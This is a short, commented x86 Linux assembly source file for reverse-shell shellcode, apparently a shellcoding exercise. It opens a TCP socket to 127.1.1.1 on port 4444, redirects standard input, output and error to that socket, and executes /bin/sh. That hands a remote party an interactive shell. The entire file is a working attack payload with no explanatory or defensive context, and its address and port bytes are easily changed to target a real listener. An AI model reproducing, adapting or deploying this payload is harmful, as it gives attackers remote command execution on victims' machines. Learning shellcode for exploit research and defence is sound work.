global _start

section .text
_start:
    ; sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    xor ebx, ebx    ; Clear EBX
    mul ebx         ; Multiply EAX * 0, also clears EDX
    mov al, 0x66    ; SOCKETCALL syscall
    mov edi, eax    ; Save syscall for future use

    inc ebx         ; SYS_SOCKET (1)

    push edx        ; SYS_SOCKET arg: PROTOCOL
    push 0x1        ; SYS_SOCKET arg: SOCK_STREAM
    push 0x2        ; SYS_SOCKET arg: AF_INET
    mov ecx, esp    ; Point ECX to syscall args

    int 0x80        ; Execute syscall
    xchg esi, eax   ; Save syscall return value
    
connect:
    ; connect(sock_fd, (struct sockaddr *)&s_addr, sizeof(s_addr));
    mov eax, edi    ; SOCKETCALL
    or bl, 0x2      ; SYS_CONNECT (3)

    push 0x0101017f ; sin_addr = 127.1.1.1
    mov cx, 0x5c11  ; sin_port
    shl ecx, 0x10   ; ECX -> 0x5C110000
    or cl, 0x2      ; ECX -> 0x5C110002
    push ecx        ; Push sockaddr struct
    mov ecx, esp    ; Move pointer to struct sockaddr into ECX
    
    push 0x10       ; sockaddr_in length: short + unsigned short + unsigned long + char[8] = 16 bytes
    push ecx        ; Pointer to new sockaddr_in struct
    push esi        ; Old socket FD
    mov ecx, esp    ; Move argument pointer to ECX

    int 0x80        ; Execute syscall


dup:
    ; for (int i = 2; i >= 0; i--) dup2(sock_fd, i);
    xchg esi, ebx   ; Our socket's FD is stored in ESI; move it to EBX
    xor ecx, ecx    ; Clear ECX

dup_loop:
    mov al, 0x3f    ; dup2 syscall
    int 0x80        ; Execute syscall
    inc ecx
    cmp cl, 0x3
    jle dup_loop

exec:
    ; execl("/bin/sh", NULL, NULL);
    push edx        ; null terminate
    push 0x68732F2F ; hs//
    push 0x6E69622F ; nib/
    mov ebx, esp    ; Load executable path into EBX
    xor eax, eax    ; Clear EAX
    mov al, 0xB     ; EXECVE syscall
    xor ecx, ecx    ; Clear ECX
    int 0x80
